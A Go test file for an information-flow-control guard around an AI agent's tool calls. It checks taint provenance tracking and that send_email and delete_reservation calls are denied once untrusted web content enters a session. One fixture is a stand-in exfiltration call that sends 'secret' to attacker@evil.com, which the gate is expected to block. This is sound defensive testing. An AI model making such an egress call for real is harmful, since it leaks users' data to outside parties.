package ifc

import (
	"context"
	"testing"
	"time"

	"github.com/anthony-chaudhary/fak/internal/abi"
)

func TestLedgerProvenanceTracking(t *testing.T) {
	led := NewLedgerCap(2)

	// Clean/unseen trace
	unseenProv := led.Provenance("unseen")
	if len(unseenProv) != 0 {
		t.Fatalf("unseen trace provenance = %+v, want empty", unseenProv)
	}
	if got := led.LatestTaint("unseen"); got != nil {
		t.Fatalf("unseen trace latest taint = %+v, want nil", got)
	}

	// Raise with provenance
	now := time.Now().Truncate(time.Millisecond)
	p1 := TaintRecord{
		Label:         abi.TaintTainted,
		SourceTool:    "read_webpage",
		CallSeq:       42,
		PayloadDigest: "sha256:abcd",
		Timestamp:     now,
	}
	led.RaiseWithRecord("t1", p1)

	gotP1 := led.LatestTaint("t1")
	if gotP1 == nil || gotP1.Label != abi.TaintTainted || gotP1.SourceTool != "read_webpage" ||
		gotP1.CallSeq != 42 || gotP1.PayloadDigest != "sha256:abcd" || !gotP1.Timestamp.Equal(now) {
		t.Fatalf("t1 provenance = %+v, want %+v", gotP1, p1)
	}
	provList := led.Provenance("t1")
	if len(provList) != 1 || provList[0].SourceTool != "read_webpage" {
		t.Fatalf("t1 provenance list = %+v, want 1 record with read_webpage", provList)
	}

	// Lower or equal rank does not overwrite higher provenance
	pLower := TaintRecord{
		Label:      abi.TaintTrusted,
		SourceTool: "safe_tool",
	}
	led.RaiseWithRecord("t1", pLower)
	if got := led.LatestTaint("t1"); got == nil || got.SourceTool != "read_webpage" {
		t.Fatalf("lower rank should not overwrite provenance: got tool %+v", got)
	}

	// Higher rank (Quarantined) overwrites
	pQuar := TaintRecord{
		Label:      abi.TaintQuarantined,
		SourceTool: "poison_probe",
		CallSeq:    43,
		Timestamp:  now.Add(time.Second),
	}
	led.RaiseWithRecord("t1", pQuar)
	if got := led.LatestTaint("t1"); got == nil || got.Label != abi.TaintQuarantined || got.SourceTool != "poison_probe" {
		t.Fatalf("higher rank should update provenance: got %+v", got)
	}
	if list := led.Provenance("t1"); len(list) != 2 {
		t.Fatalf("expected 2 records in provenance history, got %d", len(list))
	}

	// Bounded capacity eviction evicts provenance along with mark
	led.Raise("t2", abi.TaintTainted)
	led.Raise("t3", abi.TaintTainted) // evicts t1
	if got := led.LatestTaint("t1"); got != nil {
		t.Fatalf("evicted trace should return nil latest taint, got %+v", got)
	}
	if got := led.Provenance("t1"); len(got) != 0 {
		t.Fatalf("evicted trace should return empty provenance, got %+v", got)
	}

	// Reset clears provenance
	led.Reset("t2")
	if got := led.LatestTaint("t2"); got != nil {
		t.Fatalf("reset trace should return nil latest taint, got %+v", got)
	}
	if got := led.Provenance("t2"); len(got) != 0 {
		t.Fatalf("reset trace should return empty provenance, got %+v", got)
	}
}

func TestStampGateCapturesProvenance(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	stamp := NewStampGate(led, Policy{})

	call := &abi.ToolCall{
		Tool:    "read_webpage",
		TraceID: "trace-audit-1",
		SeqNo:   7,
	}
	res := &abi.Result{
		Payload: abi.Ref{
			Kind:   abi.RefInline,
			Inline: []byte("untrusted external content"),
			Digest: "sha256:webpage_payload",
		},
	}

	stamp.Admit(ctx, call, res)

	records := led.Provenance("trace-audit-1")
	if len(records) != 1 {
		t.Fatalf("records len = %d, want 1", len(records))
	}
	prov := records[0]
	if prov.Label != abi.TaintTainted {
		t.Fatalf("level = %v, want TaintTainted", prov.Label)
	}
	if prov.SourceTool != "read_webpage" {
		t.Fatalf("SourceTool = %q, want read_webpage", prov.SourceTool)
	}
	if prov.CallSeq != 7 {
		t.Fatalf("SourceCallSeq = %d, want 7", prov.CallSeq)
	}
	if prov.PayloadDigest != "sha256:webpage_payload" {
		t.Fatalf("SourceDigest = %q, want sha256:webpage_payload", prov.PayloadDigest)
	}
	if prov.Timestamp.IsZero() {
		t.Fatalf("Timestamp is zero, want > 0")
	}

	latest := led.LatestTaint("trace-audit-1")
	if latest == nil || latest.SourceTool != "read_webpage" {
		t.Fatalf("latest = %+v, want read_webpage", latest)
	}
}

func TestSinkGateMetaAndFixOnTrustViolation(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	stamp := NewStampGate(led, Policy{})
	sink := NewSinkGate(led, Policy{})

	// 1. Taint session with StampGate
	stamp.Admit(ctx, &abi.ToolCall{
		Tool:    "fetch_url",
		TraceID: "trace-audit-2",
		SeqNo:   10,
	}, &abi.Result{
		Payload: abi.Ref{Kind: abi.RefInline, Inline: []byte("payload"), Digest: "sha256:fetch1"},
	})

	// 2. Call sensitive sink with external destination in arguments
	egressCall := &abi.ToolCall{
		Tool:    "send_email",
		TraceID: "trace-audit-2",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"attacker@evil.com","body":"secret"}`)},
	}

	v := sink.Adjudicate(ctx, egressCall)
	if v.Kind != abi.VerdictDeny {
		t.Fatalf("want VerdictDeny, got %v", v.Kind)
	}
	if v.Reason != abi.ReasonTrustViolation {
		t.Fatalf("want ReasonTrustViolation, got %v", v.Reason)
	}
	if v.Meta["subsystem"] != "ifc-sink" {
		t.Fatalf("subsystem = %q, want ifc-sink", v.Meta["subsystem"])
	}
	if v.Meta["deny_rule"] != "ifc_taint_egress" {
		t.Fatalf("deny_rule = %q, want ifc_taint_egress", v.Meta["deny_rule"])
	}
	if v.Meta["taint_source_tool"] != "fetch_url" {
		t.Fatalf("taint_source_tool = %q, want fetch_url", v.Meta["taint_source_tool"])
	}
	if v.Meta["offending_arg"] != "to" {
		t.Fatalf("offending_arg = %q, want to", v.Meta["offending_arg"])
	}
	wantFix := "IFC egress block: parameter 'to' contains external destination; strip off-box destination keys from send_email or authorize tool in policy"
	if v.Meta["fix"] != wantFix {
		t.Fatalf("fix = %q, want %q", v.Meta["fix"], wantFix)
	}

	// 3. Call sensitive sink WITHOUT external destination in arguments (e.g. destructive sink)
	destructCall := &abi.ToolCall{
		Tool:    "delete_reservation",
		TraceID: "trace-audit-2",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"id":"res-999"}`)},
	}

	vDestruct := sink.Adjudicate(ctx, destructCall)
	if vDestruct.Kind != abi.VerdictDeny {
		t.Fatalf("want VerdictDeny, got %v", vDestruct.Kind)
	}
	if vDestruct.Meta["offending_arg"] != "" {
		t.Fatalf("offending_arg should be empty, got %q", vDestruct.Meta["offending_arg"])
	}
	if vDestruct.Meta["taint_source_tool"] != "fetch_url" {
		t.Fatalf("taint_source_tool = %q, want fetch_url", vDestruct.Meta["taint_source_tool"])
	}
	wantDestructFix := "IFC DESTRUCTIVE block: session carries untrusted data; avoid outbound egress or authorize tool in policy"
	if vDestruct.Meta["fix"] != wantDestructFix {
		t.Fatalf("fix = %q, want %q", vDestruct.Meta["fix"], wantDestructFix)
	}
}

func TestFindExternalDestinationDeterministic(t *testing.T) {
	args := map[string]any{
		"path":     "/var/log/app.log",
		"endpoint": "https://api.remote.com/v1",
		"to":       "user@example.com",
	}
	k, val, ok := findExternalDestination(args)
	if !ok {
		t.Fatalf("expected to find external destination")
	}
	// "endpoint" precedes "to" alphabetically
	if k != "endpoint" || val != "https://api.remote.com/v1" {
		t.Fatalf("expected deterministic key 'endpoint', got %q (%q)", k, val)
	}
}

func TestLedgerProvenanceBaseTraceDeterministicDescending(t *testing.T) {
	led := NewLedgerCap(10)

	base := "sess-abc"
	led.RaiseWithRecord(TurnTrace(base, 1), TaintRecord{
		Label:      abi.TaintTainted,
		SourceTool: "tool_turn1",
	})
	led.RaiseWithRecord(TurnTrace(base, 3), TaintRecord{
		Label:      abi.TaintTainted,
		SourceTool: "tool_turn3",
	})
	led.RaiseWithRecord(TurnTrace(base, 2), TaintRecord{
		Label:      abi.TaintTainted,
		SourceTool: "tool_turn2",
	})

	// Provenance for base should deterministically pick the latest turn (turn 3)
	for i := 0; i < 20; i++ {
		p := led.LatestTaint(base)
		if p == nil || p.SourceTool != "tool_turn3" {
			t.Fatalf("iteration %d: expected latest turn tool_turn3, got %+v", i, p)
		}
		prov := led.Provenance(base)
		if len(prov) != 3 {
			t.Fatalf("iteration %d: expected 3 records, got %d", i, len(prov))
		}
		if prov[len(prov)-1].SourceTool != "tool_turn3" {
			t.Fatalf("iteration %d: expected latest record tool_turn3, got %q", i, prov[len(prov)-1].SourceTool)
		}
	}
}
